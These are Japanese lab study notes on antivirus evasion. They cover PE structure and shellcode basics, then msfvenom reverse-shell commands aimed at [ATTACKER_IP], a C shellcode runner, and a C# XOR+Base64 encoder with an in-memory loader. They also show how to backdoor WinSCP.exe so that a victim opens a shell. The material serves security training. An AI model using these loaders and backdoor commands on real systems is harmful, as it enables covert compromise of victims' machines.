# はじめに：AV検出回避とペイロード構築

- 目的は、一般的なAVエンジンによる検出を回避するためのペイロードを作成・配信する方法を探ること
- 攻撃者視点で使えるテクニックと、それぞれの利点と弱点を取り上げる
- シェルコードは、特定の目的を達成するために使用されるアセンブリベースのバイナリコードであり、ペイロードの核になる

AVのDetection techniqueとその回避策概要：

| 手法            | 説明                     | 回避策                |
| ------------- | ---------------------- | ------------------ |
| 静的シグネチャ分析     | 既知のバイト列と照合するブラックリスト方式。 | コード暗号化、バイナリ改変で回避可。 |
| 静的ヒューリスティック分析 | よくある悪意あるコードのパターンを検出。   | スタブに怪しい処理を含めない。    |
| 動的解析          | サンドボックス環境で実行し、挙動を観察。   | スタブを実行させないように騙す。   |

- 参考記事：[Bypass Antivirus Dynamic Analysis](https://web.archive.org/web/20210317102554/https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf)

# Windowsバイナリの基礎：PE構造

## PE（Portable Executable）とは？

- WindowsのEXEやDLLファイルに使われる実行形式のファイル構造
- OSのローダーがこの構造を解析し、プログラムをメモリにロード・実行する
- x86 / x64 両方に対応し、Windows上のバイナリはほとんどがこの形式を使っている
- 関連ノート：[Windows Internal](../../../Cheatsheet/🪟Windows/Windowsの基礎・前提知識/Windows%20Internal.md#Portable%20Executable%20Format)    

### なぜPE構造を知るべきか？

- パッキング／アンパッキング処理や、AV回避に関わる改変の多くはPE構造の理解が前提
- AVやマルウェア解析ツールはPE内の情報をもとに悪意の有無を判断する
- マルウェア開発者やRed Teamにとって、どのセクションにシェルコードを格納するかは戦略的に重要

### PEの構成セクションの例

![](../../../画像ファイル/Pasted%20image%2020230619174004.png)

$$PEの構成要素$$

|セクション名|内容|
|---|---|
|`.text`|実行されるコード本体（関数など）|
|`.data`|初期化済みの変数|
|`.bss`|未初期化の変数（サイズだけ確保）|
|`.rdata`|読み取り専用データ（定数など）|
|`.edata`|エクスポート関数テーブル|
|`.idata`|インポート関数テーブル|
|`.reloc`|再配置情報|
|`.rsrc`|画像、アイコン、マニフェストなどのリソース|
- 関連ノート：[コンピュータ・アセンブラ・バイナリの基礎知識](../../../Misc/コンピュータ・アセンブラ・バイナリの基礎知識.md#メモリの領域)

### 実行までの流れ（Windowsローダー）

1. ヘッダーを解析：`MZ`マジック、ファイル形式、CPUアーキテクチャなどを判定
2. セクション情報を読み取る：セクション数や各セクションのオフセットを確認
3. メモリマッピング：EntryPointとImageBaseの情報をもとにコードをメモリに展開
4. DLLやインポート関数の読み込み
5. EntryPointに制御を移し、コードを実行

### シェルコードの格納場所とPEセクション

どのようにシェルコードを定義するかによって、PE内で格納される場所が変わる：
1. ローカル変数として定義：`.text` セクションに格納
2. グローバル変数として定義：`.data` セクションに格納
3. リソースとして格納（画像など）：`.rsrc` セクションに格納
4. 独自セクションを作成し格納：新しいセクションを手動で定義可能

# シェルコードについて

- シェルコードは、攻撃者が任意の命令を実行するためのマシン語コード
- 主に脆弱なアプリに注入され、**シェルを開いたり、コマンドを実行**したりする目的で使われる
- 多くの場合アセンブリで書かれ、16進数オペコードとして扱われる
- AV回避にはカスタムシェルコードが有効だが、アセンブリの高度な知識が必要

## 自作シェルコードに必要なスキル

- x86/x64 アーキテクチャの理解
- アセンブリ、Cなどの低レベル言語の知識
- Linux / Windows のOS内部に関する理解

## Linuxでの簡単なシェルコード例

画面に「THM, Rocks!」を出力し終了するコード。以下の2つのLinuxシステムコールを使用：

| syscall | 機能      | rax  | rdi   | rsi       | rdx |
| ------- | ------- | ---- | ----- | --------- | --- |
| write   | 出力      | 0x1  | fd    | バッファのポインタ | サイズ |
| exit    | プログラム終了 | 0x3c | 終了コード |           |     |

### アセンブリコードの動き（概要）

```c
global _start

section .text
_start:
    jmp MESSAGE      ; //1) MESSAGEへのジャンプを行う

GOBACK:
    mov rax, 0x1
    mov rdi, 0x1
    pop rsi          ; //3) `rsi`にポップしている。これにより、"THM, Rocks!\r\n"のアドレスを得ることができる
    mov rdx, 0xd
    syscall

    mov rax, 0x3c
    mov rdi, 0x0
    syscall

MESSAGE:
    call GOBACK       ; //2) `call`を使用したため、戻りアドレス（この場合は"THM, Rocks!\r\n"のアドレス）がスタックにプッシュされる
    db "THM, Rocks!", 0dh, 0ah
```

1. `jmp MESSAGE` で後方にジャンプ
2. `call GOBACK` で戻りアドレス（メッセージの位置）をスタックに積む
3. `pop rsi` でメッセージアドレスを取り出す
4. syscallを使って標準出力にメッセージを表示
	- syscallで、sys_writeやsys_exitが実行
5. 次にsys_exitを使って終了

### コンパイルと実行手順

```zsh
nasm -f elf64 thm.asm
ld thm.o -o thm
./thm
```
- `thm.o`は1行目のコマンドの実行結果で出力されたファイル
- `elf64` : 64ビット ELF（Executable and Linkable Format）形式
- `ld`: オブジェクトをリンクして最終的な実行ファイルを得る

# 公開ツールによるシェルコード生成と実行手法

## 1. 公開ツールを使ったシェルコード生成

- Metasploit Framework などの公開ツールを利用すれば、ゼロからアセンブリを書くことなくシェルコードを生成できる    
- たとえば、ドロッパー（Droppers）に埋め込む場合、シェルコードは C 言語などで動作可能な形式で生成する必要がある
- 公開 C2 フレームワークは、自身のプラットフォームに最適化されたシェルコード生成機能を持っている

🚨注意点：
- 公開ツールで生成されるシェルコードの多くは、AV（アンチウイルス）に既知のパターンとして認識され、容易に検出される

### 例：`calc.exe` を実行するシェルコードの生成

```zsh
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
```
- Windowsの電卓（calc.exe）を起動するシェルコードが出力される
- このコードは PoC（Proof of Concept）としてよく使われるGenerate Shellcode

## 2. 生成したShellcode Injection（シェルコード注入）

- 攻撃者はシェルコードを他のプロセスまたはスレッドに注入し、実行フローを書き換えることで任意のコードを実行する 
- `VirtualProtect` を使ってメモリ領域に実行権限を与え、シェルコードを関数ポインタ経由で呼び出す

### 例：Cコードによるシェルコードの注入と実行

```c
#include <windows.h>

char stager[] =
{
    //生成したシェルコードを挿入
};

int main()
{
    DWORD oldProtect;
    VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
    int (*shellcode)() = (int(*)())(void*)stager;
    shellcode();
}
```

- これをexeファイルとしてコンパイル
```zsh
i686-w64-mingw32-gcc calc.c -o calc-MSF.exe
```

- Windows への転送と実行（例としてsmbclient）
```zsh
smbclient -U thm '//[IP]/Tools'
smb: \> put calc-MSF.exe
```
```powershell
.\calc-MSF.exe
```
- → 多くの場合、AntiScan などで AV に検出される

## 3. EXEファイルからのシェルコード生成

- シェルコードは `.bin` ファイルとしても出力可能
- バイナリ形式のシェルコードを取得するために `xxd -i` を使用する
- 目的は一度バイナリとして保存しておけば、複数の言語やツールで共通して利用できるから

### バイナリ形式での生成と変換

- rawのバイナリファイルを作成する：
```zsh
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin
xxd -i /tmp/example.bin
```
- 出力される C 配列は、`-f c` オプションで直接生成されるシェルコードと一致する

# エンコーディングと暗号化の概要

## Encoding（エンコーディング）とは

- エンコードとは、データをある形式から別の形式に変換する処理のこと。主な目的は、可読性、互換性、保存性を高めること。
- 動画、HTML、URL、バイナリファイル（EXE、画像など）といった様々なデータ形式に適用できる。
- 一般的な用途としては、以下のようなものがある。
    - プログラムのコンパイル・実行
    - データの保存・送信
    - ファイル変換などのデータ処理

- セキュリティ分野では、AV回避の一環として、シェルコードなどの文字列を隠すためにエンコードが使われる。
- ただし、単純なエンコードでは、AVソフトによりデコードされて検出される可能性がある。
- そのため、複数のエンコードアルゴリズムを組み合わせて使用することで、検出を困難にすることができる。
    
- 例として、「THM」という文字列をまず16進数に変換し、さらにBase64でエンコードすることで、より難読化された形式にすることができる。
![](../../../画像ファイル/Pasted%20image%2020230620160130.png)
$$エンコーディングの例$$

## Encryption（暗号化）とは

- 暗号化とは、データを保護するために、元の平文（プレーンテキスト）を暗号文に変換する技術。
- 暗号文を正しく復号するには、使用されたアルゴリズムと鍵を知っている必要がある。
- 主に、機密性を保ち、データへの不正アクセスや改ざんを防止する目的で使用される。
- 暗号方式には、大きく分けて以下の2つがある。
    - 共通鍵方式（送受信者が同じ鍵を共有）
    - 公開鍵・秘密鍵方式（非対称鍵）
        
- データの安全な保存や通信、エンドツーエンドの暗号化など、さまざまな分野で使われている。

## なぜ Encoding や Encryption を理解する必要があるのか

- AVソフトは、Metasploitのような一般公開されているツールによって生成されたシェルコードを、静的・動的解析によって高い確率で検出する。
- そのため、生成されたシェルコードをそのまま使うと、ドロッパーが検出されるリスクが非常に高い。
- エンコーディングや暗号化を用いることで、シェルコードの内容を難読化・秘匿し、AVからの検出を回避できる可能性が高まる。
- これらの技術は、シェルコードだけでなく、関数名や変数名の難読化にも応用できる。
## まとめ

| 項目      | エンコーディング（Encoding）  | 暗号化（Encryption）       |
| ------- | ------------------- | --------------------- |
| 主な目的    | 可読性・互換性・保存性の向上      | 機密性の確保                |
| 可逆性     | あり（簡単に元に戻せる）        | あり（鍵が必要）              |
| セキュリティ性 | 低い（回避技術としては補助的）     | 高い（鍵がなければ復号できない）      |
| 主な使用例   | ファイル保存、通信、データ処理、難読化 | セキュア通信、データ保護、機密情報の送受信 |

# Shellcode Encoding and Encryption

Windows DefenderなどのAV（アンチウイルス）を回避するためのシェルコードのエンコードおよび暗号化手法に焦点を当てる。

## MSFVenomによるエンコード

- Metasploitの`msfvenom`は、エンコード機能を提供している。
- しかし、AVベンダーはこれらのツールの動作を把握しており、ツール由来のペイロードはしばしば検出される。
- 生成されたペイロードをそのまま使用すると、ディスクに保存された時点で検出される可能性がある。

### 検出の実例

まず、以下のコマンドで、`msfvenom`で使用可能なエンコーダの一覧（評価がexcellentのもの）を確認する。
```zsh
msfvenom --list encoders | grep excellent
```

その中から、代表的な`shikata_ga_nai`エンコーダを使って3回のエンコードを施したペイロードを生成する。
```zsh
msfvenom -a x86 --platform Windows LHOST=[ATTACKER_IP] LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
```
このように生成されたペイロードは、AVが即座に検出してフラグを立てるため、実用性は低い。

## カスタムペイロードの作成

回避手段として効果的なのは、**AVが解析できないカスタムなエンコーディング手法**を使うこと・
- 高度な複雑さは不要で、AVが正しく解析できない程度の混乱を与えれば十分。
- XOR + Base64の組み合わせで十分に回避可能。

まず、CSharp形式でリバースシェルを生成する。
```zsh
msfvenom LHOST=[ATTACKER_IP] LPORT=[PORT] -p windows/x64/shell_reverse_tcp -f csharp
```

### Encoderの作成

次に、生成されたシェルコードを受け取ってXOR・Base64エンコードするカスタムプログラムを作成する。

#### Encoderプログラム

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Encrypter
{
    internal class Program
    {
        private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
        static void Main(string[] args)
        {
            // XOR Key - It has to be the same in the Dropper for Decrypting
            string key = "THMK3y123!";

            // Convert Key into bytes
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            // Original Shellcode here (csharp format)
            byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 };

            // XORing byte by byte and saving into a new array of bytes
            byte[] encoded = xor(buf, keyBytes);
            Console.WriteLine(Convert.ToBase64String(encoded));        
        }
    }
}

```

.\Encrypter.exe

この出力結果が、エンコード済みのシェルコード（Base64形式）になる。

## Self-decoding Payload

エンコード済みのペイロードを使用するには、**実行時に復号・展開**するためのコードが必要。

以下のC#コードでは、Base64をデコードし、同じキーでXOR復号した後、メモリ上で実行する。
#### Decoderのプログラム

```csharp
using System;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
  
  private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
  public static void Main()
  {
    string dataBS64 = "[Encoded Shellcode]";
    byte[] data = Convert.FromBase64String(dataBS64);

    string key = "THMK3y123!";
    byte[] keyBytes = Encoding.ASCII.GetBytes(key);

    byte[] encoded = xor(data, keyBytes);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);
  }
}
```

### コンパイルと実行

以下のコマンドでコンパイル：
```powershell
csc.exe EncStageless.cs
```
そして、実行前に`nc`でリッスン：
```powershell
nc -lvp [PORT]
```

## 補足

この方法は、高度な難読化やスタブ不要で、XOR + Base64の2段階だけでAVの検出を回避することが可能。シンプルながら、非常に効果的なテクニック。

# Packers

## パッカーとは何か

- パッカー（Packer）は、プログラムの構造を変形することでディスク上のAVによる検出を回避するためのツール
- プログラムの機能自体は変わらず、**構造と外見だけが変化**する

### 主な目的

| 目的            | 説明                    |
| ------------- | --------------------- |
| サイズ圧縮         | 容量削減と転送効率の向上          |
| 逆コンパイル対策（難読化） | リバースエンジニアリングを困難にする    |
| デバッグ妨害        | デバッガによる解析を困難にするコードを挿入 |

- パッカーはマルウェアの難読化にも広く使用されている
- よく使われるパッカーには、UPX、MPRESS、Themidaなどがある
	- 最近のAVの回避には効果が薄い

---

## Packing an Application

パッキングとは、アプリケーションを別の形に変換し、そのままでは動かないようにしつつ、内部に**アンパッカー機能を内蔵**させておく処理

### 実行構造の変化（例）

1. アプリケーションのコードが圧縮・暗号化される
2. パック後のバイナリにはアンパッカーコード（Stub）が追加される
3. Entry Pointはアンパッカー（Stub）を指すように書き換えられる
4. 実行時にアンパッカーが元のコードをメモリ上に展開し、そこに実行フローを移す

|用語|意味|
|---|---|
|Entry Point|実行が始まるアドレス（実行ファイルの起点）|
|Stub|小さく独立したコード片。ここではアンパッカー機能のこと|

## パッカーとAV

### パッカーによるAV回避の例

- 例：リバースシェルの実行ファイルが、既知のシグネチャとしてAVに検出されてしまう
- この実行ファイルをパッカーで変換すれば、**シグネチャが変わる**ため、AVによる検出を回避可能
- よって、安全にディスク経由でペイロードを配送可能になる

### AVがそれでも検出できる理由

|検出の理由|内容|
|---|---|
|アンパッカースタブの検出|パックされたファイルに含まれるスタブが既知のパターンとして検出される可能性がある|
|メモリ内の動的検出|アンパック後、メモリ内に展開された元のコードを動的スキャンにより検出される場合がある|

# Binders

## バインダーとは何か

- AVバイパスの直接的な手法ではないが、エンドユーザーに悪意あるペイロードを配布する際に有効な技術
- 複数の実行ファイルを1つに統合するプログラムのこと
- 正規のアプリケーションにペイロードを埋め込み、ユーザには通常のアプリを動かしていると思わせる用途で使われる
- 基本構造は以下のようなもの
    - 正規プログラムの内部にシェルコードを埋め込む
    - PEヘッダーのエントリーポイントを書き換え、まずシェルコードを実行
    - シェルコードの実行後に、正規のプログラムへ制御を戻す
    - ユーザーは裏で何が起こったか気づかない

## Binding with msfvenom

### 基本

- `msfvenom` を使うことで `.exe` ファイルへ簡単にペイロードを注入可能
- 注入された実行ファイルは表向き通常通り動作する一方、バックグラウンドでペイロードも実行される
- `msfvenom` は新しいスレッドを作成してペイロードを実行するため、シェルコードがクラッシュしても元プログラムがブロックされない利点がある

### 使用例

- WinSCP実行ファイル（`WinSCP.exe`） をバックドア化する例


1. リスナーをたてる
```zsh
nc -lvnp 4444
```

2. シェルコードを作成
```zsh
msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=4444 -f exe -o WinSCP-evil.exe
```

3. 生成された `WinSCP-evil.exe` を被害者に実行させる→シェル獲得

|オプション|内容|
|---|---|
|`-x`|ペイロードのベースに使う実行ファイルを指定|
|`-k`|ペイロードを新規スレッドで実行する|
|`-p`|使用するペイロード（例：リバースシェル）|
|`-f`|出力フォーマット|
|`-o`|出力ファイル名|

## BinderとAVの関係

- バインダーはAV回避に効果的とは言えない
- バインダーの主目的は「正規アプリケーションを使っている」と**ユーザーを欺く**こと
- 結合された実行ファイルは、元のペイロードのシグネチャを保持しており、静的解析で検出されるリスクが高い

## AV回避の補完技術

|手法|説明|
|---|---|
|エンコーダー|シェルコードを難読化して既知のAVシグネチャを避ける|
|暗号化|シェルコードを暗号化し、実行時に復号して展開|
|パッカー|実行ファイル全体を難読化し、構造を隠す|

これらの技術を併用してシェルコードを隠蔽して<u>AVを回避し</u>、最終的にBinderで配布用の実行ファイルに組み込み<u>ユーザーを欺く構成</u>が一般的。
